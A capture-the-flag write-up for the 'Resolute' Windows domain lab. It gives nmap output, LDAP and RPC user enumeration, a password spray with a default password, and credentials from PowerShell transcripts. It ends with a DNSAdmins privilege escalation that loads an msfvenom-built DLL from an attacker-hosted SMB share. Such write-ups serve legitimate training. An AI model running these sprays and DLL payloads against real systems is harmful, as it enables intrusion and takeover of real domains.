# Writeup resolute

## Scan

Domain: megabank.local

```bash
# Nmap 7.92 scan initiated Sat Sep 10 13:59:03 2022 as: nmap -sV -sC -A -T5 -v -oN scan.txt 10.129.96.155
Nmap scan report for 10.129.96.155
Host is up (0.16s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-09-10 18:06:28Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-10T18:06:41
|_  start_date: 2022-09-10T17:06:50
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2022-09-10T11:06:39-07:00
|_clock-skew: mean: 2h27m00s, deviation: 4h02m30s, median: 6m59s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 10 13:59:52 2022 -- 1 IP address (1 host up) scanned in 49.11 seconds
```

## Enumeration

Doing a enumeration, we could found some user with your password in description.

Methods to obtain user and password

> ldapsearch

Obtain bc from domain:

```bash
ldapsearch -h 10.129.96.155 -x -s base namingcontexts
```

Collect user and descriptions:

```bash
ldapsearch -x -h 10.129.96.155 -b "dc=megabank;dc=local" "objectclass=user" | grep -i "description" -A1
```

> cme
> 
> ```bash
> cme smb 10.129.96.155 --users
> ```

> User enum list
> 
> ```bash
> rpcclient -U "" -N 10.129.96.155 -c "enumdomusers" | awk -F'[' '{print $2}' | awk -F']' '{print $1}' > user.txt
> ```

> rpcclient
> 
> ```bash
> rpcclient $> querydispinfo
> ```

> windapsearch
> 
> ```bash
> python3 windapsearch.py --dc-ip 10.129.57.92 --attrs sAMAccountName,description -U
> ```

## Exploitation

After discovered the default password, we use our user wordlist to do a password spray to find what user are using the default password.

```bash
cme smb 10.129.96.155 -u user.txt -p 'Welcome123!'
```

> User found:
> 
> **melanie:Welcome123!**

Login with evil-winrm and "cat" the flag.

```bash
evil-winrm -i 10.129.96.155 -u 'melanie' -p 'Welcome123!'
```

## Privilege Escalation

With a shell, we need to find anything that aalow us to do privesc.

In root directory, we have "PSTranscripts" folder. It was found using **ls -force** or **get-childitem -Hidden** 

In PSTranscripts we have a file that contains a Ryan credentials.

> Ryan Credentials:
> 
> ryan:Serv3r4Admin4cc123!

Using ryan credentials, we can login with his account via evil-winrm and see that he are member of DNSAdmins.

> First Step - Create dll 
> 
> ```bash
> msfvenom -p windows/x64/exec cmd='net localgroup "Administrators" melanie /add /domain' -f dll > dns.dll
> ```

> Second Step - Up smbserver 
> 
> ```bash
> python3 /opt/impacket/examples/smbserver.py dll . -smb2support
> ```

> Third Step - Execute the PrivEsc
> 
> ```powershell
> dnscmd /config /serverlevelplugindll \\10.10.14.83\dll\dns.dll
> ```
> 
> ```powershell
> sc.exe stop dns
> ```
> 
> ```powershell
> sc.exe start dns
> ```

After these commands, the user "melanie" will be added to the "Administrators" group and we will be able to login and get the flag.
